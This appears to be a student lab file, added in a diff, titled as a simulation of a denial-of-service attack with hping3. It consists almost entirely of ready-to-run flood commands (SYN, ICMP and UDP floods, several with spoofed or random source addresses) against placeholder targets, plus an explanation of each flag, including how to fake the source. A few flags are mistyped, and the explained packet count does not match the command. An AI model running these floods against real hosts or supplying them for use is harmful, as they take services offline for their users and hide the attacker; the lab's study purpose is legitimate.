@@ -1,0 +1,50 @@
+Aim : To simulate DOS attack by using HPING and other tools
+
+
+sudo apt-get install hping3 -y
+
+-----> Simple SYN flood – DoS using HPING3 :
+sudo hping3 -S --flood -V www.hping3testsite.com 
+
+-----> Simple SYN flood with spoofed IP – DoS using HPING3 :
+sudo hping3 -S -P -U –flood -V --rand-source www.hping3testsite.com  
+
+-----> flood the IP x.x.x.x with ping requests originating from IP y.y.y.y using :
+sudo hping3 -1 --flood -a y.y.y.y x.x.x.x
+
+-----> flood the IP x.x.x.x on port 80 with SYN requests from fake IP y.y.y.y, using :
+sudo hping3 -S -a y.y.y.y --flood -p 80 x.x.x.x 
+
+-----> BY DEFAULT hping3 attacks on TCP ports, to change it to UDP just use -2 option :
+sudo hping3 --flood -a y.y.y.y -2 -p 6234 x.x.x.x  
+
+-----> divert all the traffic to intended PC blocking accessing of port 80 :
+sudo hping3 x.x.x.x --flood -p 80
+
+-----> DoS using hping3 with random source IP :
+sudo hping3 -c 1000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+
+
+Conclusion:
+Hence we have successfully studied simulation of DOS attack by using HPING3.
+
+
+Explanation :
+1. hping3 = Name of the application binary.
+2. -c 100000 = Number of packets to send.
+3. -d 120 = Size of each packet that was sent to target machine.
+4. -S = I am sending SYN packets only.
+5. -w 64 = TCP window size.
+6. -p 21 = Destination port (21 being FTP port). You can use any port here.
+7. --flood = Sending packets as fast as possible, without taking care to show incoming replies. Flood mode.
+8. --rand-source = Using Random Source IP Addresses. You can also use -a or –spoof to hide hostnames. See MAN page below.
+9. www.hping3testsite.com = Destination IP address or target machines IP address. You can also use a website name here.
+10. -1 : ICMP mode ; -2 : UDP mode ; -8 (Scan mode) ; -9 (Listen mode)
+11. -a : Fake Hostname ; -p : Destination port
+12. -A (ACK) ; -R (RST) ; -F (FIN) ; -P (PUSH) ; -U (URG i.e urgent)
+13. -v : version ; -V : verbose i.e. Turns verbose output on
+
+
+
+
+
